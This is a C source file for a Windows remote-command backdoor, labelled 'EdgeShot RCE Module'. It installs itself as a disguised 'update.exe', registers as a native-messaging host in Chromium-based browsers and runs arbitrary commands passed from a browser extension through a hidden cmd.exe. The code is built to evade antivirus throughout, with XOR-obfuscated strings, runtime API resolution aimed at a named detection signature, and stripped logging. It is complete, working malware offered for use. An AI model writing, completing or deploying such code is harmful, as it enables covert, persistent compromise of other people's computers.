/*
 * Native Messaging Host — EdgeShot RCE Module
 * Compile (Windows, MinGW): pick ONE browser flag — -DCHROME / -DVIVALDI /
 *   -DBRAVE / -DCHROMIUM (omit all of them for Edge). Example:
 *     x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DVIVALDI -o update.exe native-host.c
 *   Do NOT use -DBROWSER=<name>: that string macro is never tested by the #if
 *   chain below, so it silently compiles an Edge host on every browser.
 *   Add -DDEBUG_LOG to re-enable the %TEMP%\update_host.log trace (off by default:
 *   the log format strings are heavy static IOCs, so the release build omits them).
 *
 * Dual-mode binary — mode detection by comparing own path vs install path.
 *   INSTALL:  self-copy + registry + manifest.json (discovers extension IDs)
 *   NATIVE:   Chrome Native Messaging protocol loop
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

/* ── Config ─────────────────────────────────────────────────────── */
/* Browser selection: define ONE of CHROME / BRAVE / VIVALDI / CHROMIUM (or the
 * long forms BROWSER_chrome / BROWSER_brave / BROWSER_vivaldi / BROWSER_chromium).
 * Omit all of them to target Edge (the #else fallback below). The registry key
 * and extensions path are chosen in the #if chain that follows. */

#define HOST_NAME     "com.site.agent"

/* ── String obfuscation ─────────────────────────────────────────────
 * Sensitive literals are stored XOR'd (key 0x5A) so they don't appear in a
 * `strings update.exe` dump, then decoded on the stack at point of use.
 * Arrays generated offline; each holds the raw bytes WITHOUT a trailing NUL. */
/* Key is volatile so -O2 cannot constant-fold the decode loop and re-emit the
 * plaintext in .rdata (it does exactly that with a compile-time-constant key,
 * silently defeating the obfuscation). noinline keeps the fold from happening
 * at each call site. */
static volatile unsigned char g_xkey = 0x5A;
static __attribute__((noinline)) char *xs(const unsigned char *enc, size_t n, char *out) {
    unsigned char k = g_xkey;
    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ k);
    out[n] = '\0';
    return out;
}
static const unsigned char e_cmdfmt[]   = {0x39,0x37,0x3e,0x74,0x3f,0x22,0x3f,0x7a,0x75,0x19,0x7a,0x78,0x7f,0x29,0x78}; /* cmd.exe /C "%s" */
static const unsigned char e_desc[]     = {0x09,0x23,0x29,0x2e,0x3f,0x37,0x7a,0x2f,0x2a,0x3e,0x3b,0x2e,0x3f,0x7a,0x29,0x3f,0x28,0x2c,0x33,0x39,0x3f}; /* System update service */
static const unsigned char e_updexe[]   = {0x06,0x2f,0x2a,0x3e,0x3b,0x2e,0x3f,0x74,0x3f,0x22,0x3f}; /* \update.exe */
static const unsigned char e_config[]   = {0x06,0x19,0x35,0x34,0x3c,0x33,0x3d}; /* \Config */
static const unsigned char e_hostjson[] = {0x06,0x37,0x3b,0x34,0x33,0x3c,0x3f,0x29,0x2e,0x74,0x30,0x29,0x35,0x34}; /* \manifest.json */

/* ── Dynamic API resolution ─────────────────────────────────────────
 * Wacatac.B!ml keys heavily on the import table: CreateProcess + CreatePipe +
 * PeekNamedPipe + RegCreateKeyEx + CopyFile form a textbook "dropper" histogram,
 * and advapi32/user32 in the import DLL list add to the score. We keep those APIs
 * out of the static IAT by resolving them at runtime via GetProcAddress (names
 * stored XOR'd too). This also drops advapi32.dll + user32.dll from the imports
 * entirely. GetProcAddress/GetModuleHandle/LoadLibrary stay in the IAT — they are
 * ubiquitous and benign-looking. */
static const unsigned char a_createprocessa[]     = {0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x0a,0x28,0x35,0x39,0x3f,0x29,0x29,0x1b};
static const unsigned char a_createpipe[]         = {0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x0a,0x33,0x2a,0x3f};
static const unsigned char a_peeknamedpipe[]      = {0x0a,0x3f,0x3f,0x31,0x14,0x3b,0x37,0x3f,0x3e,0x0a,0x33,0x2a,0x3f};
static const unsigned char a_copyfilea[]          = {0x19,0x35,0x2a,0x23,0x1c,0x33,0x36,0x3f,0x1b};
static const unsigned char a_regcreatekeyexa[]    = {0x08,0x3f,0x3d,0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x11,0x3f,0x23,0x1f,0x22,0x1b};
static const unsigned char a_regsetvalueexa[]     = {0x08,0x3f,0x3d,0x09,0x3f,0x2e,0x0c,0x3b,0x36,0x2f,0x3f,0x1f,0x22,0x1b};
static const unsigned char a_regclosekey[]        = {0x08,0x3f,0x3d,0x19,0x36,0x35,0x29,0x3f,0x11,0x3f,0x23};
static const unsigned char a_showwindow[]         = {0x09,0x32,0x35,0x2d,0x0d,0x33,0x34,0x3e,0x35,0x2d};
static const unsigned char a_advapi32dll[]        = {0x3b,0x3e,0x2c,0x3b,0x2a,0x33,0x69,0x68,0x74,0x3e,0x36,0x36};
static const unsigned char a_user32dll[]          = {0x2f,0x29,0x3f,0x28,0x69,0x68,0x74,0x3e,0x36,0x36};

typedef BOOL (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *fn_PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef LONG (WINAPI *fn_RegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG (WINAPI *fn_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
typedef LONG (WINAPI *fn_RegCloseKey)(HKEY);
typedef BOOL (WINAPI *fn_ShowWindow)(HWND, int);

static fn_CreateProcessA   p_CreateProcessA;
static fn_CreatePipe       p_CreatePipe;
static fn_PeekNamedPipe    p_PeekNamedPipe;
static fn_CopyFileA        p_CopyFileA;
static fn_RegCreateKeyExA  p_RegCreateKeyExA;
static fn_RegSetValueExA   p_RegSetValueExA;
static fn_RegCloseKey      p_RegCloseKey;
static fn_ShowWindow       p_ShowWindow;

static FARPROC rp(HMODULE h, const unsigned char *enc, size_t n) {
    char nm[48];
    return h ? GetProcAddress(h, xs(enc, n, nm)) : NULL;
}

static void resolve_apis(void) {
    char mod[16];
    HMODULE k32 = GetModuleHandleA("kernel32.dll");           /* already loaded, benign */
    HMODULE adv = LoadLibraryA(xs(a_advapi32dll, sizeof(a_advapi32dll), mod));
    HMODULE usr = LoadLibraryA(xs(a_user32dll, sizeof(a_user32dll), mod));
    p_CreateProcessA  = (fn_CreateProcessA)  rp(k32, a_createprocessa,  sizeof(a_createprocessa));
    p_CreatePipe      = (fn_CreatePipe)      rp(k32, a_createpipe,      sizeof(a_createpipe));
    p_PeekNamedPipe   = (fn_PeekNamedPipe)   rp(k32, a_peeknamedpipe,   sizeof(a_peeknamedpipe));
    p_CopyFileA       = (fn_CopyFileA)       rp(k32, a_copyfilea,       sizeof(a_copyfilea));
    p_RegCreateKeyExA = (fn_RegCreateKeyExA) rp(adv, a_regcreatekeyexa, sizeof(a_regcreatekeyexa));
    p_RegSetValueExA  = (fn_RegSetValueExA)  rp(adv, a_regsetvalueexa,  sizeof(a_regsetvalueexa));
    p_RegCloseKey     = (fn_RegCloseKey)     rp(adv, a_regclosekey,     sizeof(a_regclosekey));
    p_ShowWindow      = (fn_ShowWindow)      rp(usr, a_showwindow,      sizeof(a_showwindow));
}

#if defined(BROWSER_chrome) || defined(CHROME)
#define REG_PATH      "Software\\Google\\Chrome\\NativeMessagingHosts\\" HOST_NAME
#define EXT_SUBDIR    "\\Google\\Chrome\\User Data\\Default\\Extensions"
#elif defined(BROWSER_brave) || defined(BRAVE)
#define REG_PATH      "Software\\BraveSoftware\\Brave-Browser\\NativeMessagingHosts\\" HOST_NAME
#define EXT_SUBDIR    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions"
#elif defined(BROWSER_vivaldi) || defined(VIVALDI)
#define REG_PATH      "Software\\Vivaldi\\NativeMessagingHosts\\" HOST_NAME
#define EXT_SUBDIR    "\\Vivaldi\\User Data\\Default\\Extensions"
#elif defined(BROWSER_chromium) || defined(CHROMIUM)
#define REG_PATH      "Software\\Chromium\\NativeMessagingHosts\\" HOST_NAME
#define EXT_SUBDIR    "\\Chromium\\User Data\\Default\\Extensions"
#else
#define REG_PATH      "Software\\Microsoft\\Edge\\NativeMessagingHosts\\" HOST_NAME
#define EXT_SUBDIR    "\\Microsoft\\Edge\\User Data\\Default\\Extensions"
#endif

/* ── Logging ─────────────────────────────────────────────────────────
 * Compiled out by default. Every log_write() call carries a "[INSTALL] ..."
 * style format string; left in, they form a dense cluster of static IOCs. With
 * DEBUG_LOG undefined the calls become no-ops and the literals never reach the
 * binary. Build with -DDEBUG_LOG to get the %TEMP%\update_host.log trace back. */
#ifdef DEBUG_LOG
static FILE *log_fp = NULL;

static void log_init(void) {
    char path[MAX_PATH];
    if (!GetEnvironmentVariable("TEMP", path, sizeof(path))) return;
    strcat(path, "\\update_host.log");
    log_fp = fopen(path, "a");
    if (log_fp) {
        time_t t = time(NULL);
        char *ts = ctime(&t);
        if (ts) { ts[strlen(ts)-1] = '\0'; }
        fprintf(log_fp, "\n=== %s ===\n", ts ? ts : "");
        fflush(log_fp);
    }
}

static void log_write(const char *fmt, ...) {
    if (!log_fp) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(log_fp, fmt, ap);
    va_end(ap);
    fflush(log_fp);
}
#else
#define log_init()      ((void)0)
#define log_write(...)  ((void)0)
#endif

/* ── JSON mini-lib ───────────────────────────────────────────────── */
static char *json_escape(const char *src) {
    if (!src) return strdup("");
    size_t len = strlen(src), j = 0;
    char *dst = malloc(len * 2 + 4);
    if (!dst) return NULL;
    for (size_t i = 0; i < len; i++) {
        switch (src[i]) {
        case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
        case '\"': dst[j++] = '\\'; dst[j++] = '\"'; break;
        case '\n': dst[j++] = '\\'; dst[j++] = 'n';  break;
        case '\r': dst[j++] = '\\'; dst[j++] = 'r';  break;
        case '\t': dst[j++] = '\\'; dst[j++] = 't';  break;
        default:   dst[j++] = src[i]; break;
        }
    }
    dst[j] = '\0';
    return dst;
}

/* Extract a JSON string value, correctly handling escape sequences. The naive
 * version stopped at the first '"' — which for a value like
 *   "command":"powershell -c \"get-process\""
 * truncated at the escaped quote, leaving `powershell -c \`. This decodes the
 * standard JSON escapes and stops only at the real (unescaped) closing quote. */
static char *extract_json_string(const char *json, const char *key) {
    char search[256];
    snprintf(search, sizeof(search), "\"%s\"", key);
    const char *p = strstr(json, search);
    if (!p) return NULL;
    p += strlen(search);
    while (*p && (*p == ':' || *p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    if (*p != '\"') return NULL;
    p++;

    char *val = malloc(strlen(p) + 1);
    if (!val) return NULL;
    size_t j = 0;
    while (*p && *p != '\"') {
        if (*p == '\\' && p[1]) {
            p++;
            switch (*p) {
            case 'n':  val[j++] = '\n'; break;
            case 'r':  val[j++] = '\r'; break;
            case 't':  val[j++] = '\t'; break;
            case 'b':  val[j++] = '\b'; break;
            case 'f':  val[j++] = '\f'; break;
            case '/':  val[j++] = '/';  break;
            case '\\': val[j++] = '\\'; break;
            case '\"': val[j++] = '\"'; break;
            case 'u': {
                if (p[1] && p[2] && p[3] && p[4]) {
                    char hex[5] = { p[1], p[2], p[3], p[4], 0 };
                    unsigned int cp = (unsigned int)strtoul(hex, NULL, 16);
                    if (cp < 0x80) {
                        val[j++] = (char)cp;
                    } else if (cp < 0x800) {
                        val[j++] = (char)(0xC0 | (cp >> 6));
                        val[j++] = (char)(0x80 | (cp & 0x3F));
                    } else {
                        val[j++] = (char)(0xE0 | (cp >> 12));
                        val[j++] = (char)(0x80 | ((cp >> 6) & 0x3F));
                        val[j++] = (char)(0x80 | (cp & 0x3F));
                    }
                    p += 4;
                } else {
                    val[j++] = 'u';
                }
                break;
            }
            default: val[j++] = *p; break;
            }
            p++;
        } else {
            val[j++] = *p++;
        }
    }
    val[j] = '\0';
    return val;
}

/* ── Native Messaging I/O ───────────────────────────────────────── */
static char *read_message(void) {
    unsigned char len_buf[4];
    size_t read = 0;
    while (read < 4) {
        DWORD n;
        if (!ReadFile(GetStdHandle(STD_INPUT_HANDLE), len_buf + read, 4 - read, &n, NULL) || n == 0) {
            log_write("[NATIVE] stdin EOF after %zu header bytes\n", read);
            return NULL;
        }
        read += n;
    }
    unsigned int msg_len = len_buf[0] | (len_buf[1] << 8) | (len_buf[2] << 16) | (len_buf[3] << 24);
    if (msg_len == 0 || msg_len > 1024 * 1024) return NULL;
    char *msg = malloc(msg_len + 1);
    if (!msg) return NULL;
    read = 0;
    while (read < msg_len) {
        DWORD n;
        if (!ReadFile(GetStdHandle(STD_INPUT_HANDLE), msg + read, msg_len - read, &n, NULL) || n == 0) {
            free(msg);
            return NULL;
        }
        read += n;
    }
    msg[msg_len] = '\0';
    log_write("[NATIVE] recv: %s\n", msg);
    return msg;
}

static void write_response(const char *json) {
    unsigned int len = strlen(json);
    unsigned char len_buf[4] = {
        len & 0xFF, (len >> 8) & 0xFF, (len >> 16) & 0xFF, (len >> 24) & 0xFF
    };
    DWORD n;
    WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), len_buf, 4, &n, NULL);
    WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), json, len, &n, NULL);
    FlushFileBuffers(GetStdHandle(STD_OUTPUT_HANDLE));
    log_write("[NATIVE] send: %s\n", json);
}

/* ── Execute command ────────────────────────────────────────────── */
static char *exec_cmd(const char *cmd) {
    char full_cmd[8192];
    char fmt[16];
    snprintf(full_cmd, sizeof(full_cmd), xs(e_cmdfmt, sizeof(e_cmdfmt), fmt), cmd);

    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    if (!p_CreatePipe(&hRead, &hWrite, &sa, 0)) return strdup("pipe failed");

    PROCESS_INFORMATION pi = {0};
    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL ok = p_CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        char buf[256];
        snprintf(buf, sizeof(buf), "spawn failed: %lu", GetLastError());
        return strdup(buf);
    }

    char *out = malloc(65536);
    if (!out) { CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return strdup("OOM"); }
    size_t out_len = 0, out_cap = 65535;

    /* Wait for process to finish, then drain the pipe */
    WaitForSingleObject(pi.hProcess, 60000); /* 60s timeout — PowerShell needs it */

    /* Read whatever is left in the pipe */
    for (;;) {
        DWORD avail = 0;
        if (!p_PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) || avail == 0) break;
        if (avail > out_cap - out_len) avail = (DWORD)(out_cap - out_len - 1);
        DWORD n;
        if (ReadFile(hRead, out + out_len, avail, &n, NULL) && n > 0) {
            out_len += n;
        } else {
            break;
        }
    }
    /* Strip \r (CR) for clean UNIX-style output */
    size_t w = 0;
    for (size_t r = 0; r < out_len; r++) {
        if (out[r] != '\r') out[w++] = out[r];
    }
    out_len = w;
    out[out_len] = '\0';
    log_write("[EXEC] output %zu bytes: %s\n", out_len, out_len ? out : "(empty)");
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return out;
}

/* ── MODE: Native loop ──────────────────────────────────────────── */
static int native_mode(void) {
    log_write("[NATIVE] started\n");
    while (1) {
        char *msg = read_message();
        if (!msg) break;

        char *action = extract_json_string(msg, "action");
        if (!action) {
            write_response("{\"error\":\"missing action\"}");
            free(msg);
            continue;
        }

        if (strcmp(action, "ping") == 0) {
            write_response("{\"result\":\"pong\"}");
        } else if (strcmp(action, "execute_cmd") == 0) {
            char *cmd = extract_json_string(msg, "command");
            if (!cmd) {
                write_response("{\"error\":\"missing command\"}");
            } else {
                char *out = exec_cmd(cmd);
                char *esc = json_escape(out);
                char *resp = malloc(strlen(esc) + 64);
                snprintf(resp, strlen(esc) + 64, "{\"result\":\"%s\"}", esc);
                write_response(resp);
                free(resp); free(esc); free(out); free(cmd);
            }
        } else {
            char resp[512];
            snprintf(resp, sizeof(resp), "{\"error\":\"unknown action: %s\"}", action);
            write_response(resp);
        }
        free(action);
        free(msg);
    }
    log_write("[NATIVE] exiting\n");
    return 0;
}

/* ── Extension discovery helpers ──────────────────────────────────
 * Chrome extension IDs are 32 lowercase chars in [a-p]. Packed extensions live
 * under Default\Extensions\<id>\, but unpacked/sideloaded ones (BELoader, "Load
 * unpacked") are NOT copied there — they're recorded in the profile's
 * Preferences / Secure Preferences under extensions.settings.<id>. We scan those
 * files for quoted 32-char [a-p] tokens so allowed_origins lists the agent's
 * real ID (a wildcard is rejected by Chrome). */
static int ext_id_char(char c) {
    return c >= 'a' && c <= 'p';
}

static int ext_id_seen(char ids[][33], int count, const char *id) {
    for (int i = 0; i < count; i++) {
        if (strcmp(ids[i], id) == 0) return 1;
    }
    return 0;
}

static void scan_prefs_for_ids(const char *path, char ids[][33], int *count, int max) {
    FILE *f = fopen(path, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > 16 * 1024 * 1024) { fclose(f); return; }
    char *buf = malloc((size_t)sz + 1);
    if (!buf) { fclose(f); return; }
    size_t n = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[n] = '\0';

    for (size_t i = 0; i + 34 <= n; i++) {
        if (buf[i] != '"' || !ext_id_char(buf[i + 1])) continue;
        int ok = 1;
        for (int j = 0; j < 32; j++) {
            if (!ext_id_char(buf[i + 1 + j])) { ok = 0; break; }
        }
        if (ok && buf[i + 33] == '"') {
            char id[33];
            memcpy(id, buf + i + 1, 32);
            id[32] = '\0';
            if (*count < max && !ext_id_seen(ids, *count, id)) {
                strcpy(ids[(*count)++], id);
            }
            i += 33;
        }
    }
    free(buf);
}

/* ── MODE: Install ──────────────────────────────────────────────── */
static int install_mode(const char *install_path) {
    char dir[MAX_PATH];
    strcpy(dir, install_path);
    char *last = strrchr(dir, '\\');
    if (last) *last = '\0';

    log_write("[INSTALL] dir:  %s\n", dir);
    log_write("[INSTALL] exe:  %s\n", install_path);

    CreateDirectory(dir, NULL);

    char self_path[MAX_PATH];
    GetModuleFileName(NULL, self_path, MAX_PATH);
    log_write("[INSTALL] self: %s\n", self_path);

    if (p_CopyFileA(self_path, install_path, FALSE)) {
        log_write("[INSTALL] CopyFile OK\n");
    } else {
        log_write("[INSTALL] CopyFile err: %lu\n", GetLastError());
    }

    /* ── Discover extension IDs ─────────────────────────────── */
    char ext_dir[MAX_PATH];
    GetEnvironmentVariable("LOCALAPPDATA", ext_dir, sizeof(ext_dir));
    strcat(ext_dir, EXT_SUBDIR);

    char ext_ids[64][33] = {0};
    int ext_count = 0;

    log_write("[INSTALL] scanning: %s\n", ext_dir);
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", ext_dir);
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(search, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                fd.cFileName[0] != '.' && strlen(fd.cFileName) == 32 &&
                ext_count < 64) {
                strcpy(ext_ids[ext_count++], fd.cFileName);
                log_write("[INSTALL] ext found: %s\n", fd.cFileName);
            }
        } while (FindNextFile(hFind, &fd));
        FindClose(hFind);
    }
    log_write("[INSTALL] %d extensions found\n", ext_count);

    /* Unpacked/sideloaded extensions (BELoader, "Load unpacked") are NOT under
     * Default\Extensions\<id> — their settings live in the profile's Preferences
     * / Secure Preferences, keyed by the 32-char [a-p] extension ID. Read them
     * out so allowed_origins lists the agent's real ID. */
    {
        char profile_dir[MAX_PATH];
        strcpy(profile_dir, ext_dir);
        char *ext_marker = strstr(profile_dir, "\\Extensions");
        if (ext_marker) *ext_marker = '\0';

        char prefs_path[MAX_PATH];
        snprintf(prefs_path, sizeof(prefs_path), "%s\\Preferences", profile_dir);
        scan_prefs_for_ids(prefs_path, ext_ids, &ext_count, 64);
        snprintf(prefs_path, sizeof(prefs_path), "%s\\Secure Preferences", profile_dir);
        scan_prefs_for_ids(prefs_path, ext_ids, &ext_count, 64);
    }
    log_write("[INSTALL] %d extensions after prefs scan\n", ext_count);

    /* ── Write manifest.json ────────────────────────────────── */
    char manifest_path[MAX_PATH];
    char seg[32];
    strcpy(manifest_path, dir);
    strcat(manifest_path, xs(e_hostjson, sizeof(e_hostjson), seg));

    char esc_path[MAX_PATH * 2];
    size_t j = 0;
    for (size_t i = 0; install_path[i]; i++) {
        if (install_path[i] == '\\') { esc_path[j++] = '\\'; esc_path[j++] = '\\'; }
        else esc_path[j++] = install_path[i];
    }
    esc_path[j] = '\0';

    FILE *f = fopen(manifest_path, "w");
    if (f) {
        fprintf(f, "{\n");
        char descbuf[32];
        fprintf(f, "  \"name\": \"%s\",\n", HOST_NAME);
        fprintf(f, "  \"description\": \"%s\",\n", xs(e_desc, sizeof(e_desc), descbuf));
        fprintf(f, "  \"path\": \"%s\",\n", esc_path);
        fprintf(f, "  \"type\": \"stdio\",\n");
        fprintf(f, "  \"allowed_origins\": [\n");
        for (int i = 0; i < ext_count; i++) {
            fprintf(f, "    \"chrome-extension://%s/\"%s\n",
                    ext_ids[i], (i < ext_count - 1) ? "," : "");
        }
        if (ext_count == 0) {
            fprintf(f, "    \"chrome-extension://*/\"\n");
        }
        fprintf(f, "  ]\n");
        fprintf(f, "}\n");
        fclose(f);
        log_write("[INSTALL] manifest OK: %s\n", manifest_path);
    } else {
        log_write("[INSTALL] manifest FAILED: %s\n", manifest_path);
    }

    /* ── Registry ───────────────────────────────────────────── */
    HKEY hkey;
    LONG rc = p_RegCreateKeyExA(HKEY_CURRENT_USER, REG_PATH, 0, NULL,
                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                NULL, &hkey, NULL);
    if (rc == ERROR_SUCCESS) {
        rc = p_RegSetValueExA(hkey, NULL, 0, REG_SZ,
                              (const BYTE *)manifest_path,
                              strlen(manifest_path) + 1);
        log_write("[INSTALL] Registry: %ld\n", rc);
        p_RegCloseKey(hkey);
    } else {
        log_write("[INSTALL] RegCreateKeyEx: %ld\n", rc);
    }

    /* ── Verify ─────────────────────────────────────────────── */
    log_write("[INSTALL] Verify binary: %s\n",
              (GetFileAttributes(install_path) != INVALID_FILE_ATTRIBUTES) ? "OK" : "MISSING");
    log_write("[INSTALL] Verify manifest: %s\n",
              (GetFileAttributes(manifest_path) != INVALID_FILE_ATTRIBUTES) ? "OK" : "MISSING");
    log_write("[INSTALL] done.\n");
    return 0;
}

/* ── Entry point ────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    resolve_apis();
    log_init();
    p_ShowWindow(GetConsoleWindow(), SW_HIDE);

    char self_path[MAX_PATH];
    GetModuleFileName(NULL, self_path, MAX_PATH);

    char install_path[MAX_PATH], seg[32];
    if (!GetEnvironmentVariable("LOCALAPPDATA", install_path, MAX_PATH)) return 1;
    strcat(install_path, xs(e_config, sizeof(e_config), seg));   /* \Config */
    strcat(install_path, xs(e_updexe, sizeof(e_updexe), seg));   /* \update.exe */

    log_write("[MAIN] self:    %s\n", self_path);
    log_write("[MAIN] install: %s\n", install_path);

    int cmp = _stricmp(self_path, install_path);
    log_write("[MAIN] mode: %s\n", (cmp == 0) ? "NATIVE" : "INSTALL");

    int rc = (cmp == 0) ? native_mode() : install_mode(install_path);
    log_write("[MAIN] exit: %d\n", rc);
#ifdef DEBUG_LOG
    if (log_fp) fclose(log_fp);
#endif
    return rc;
}
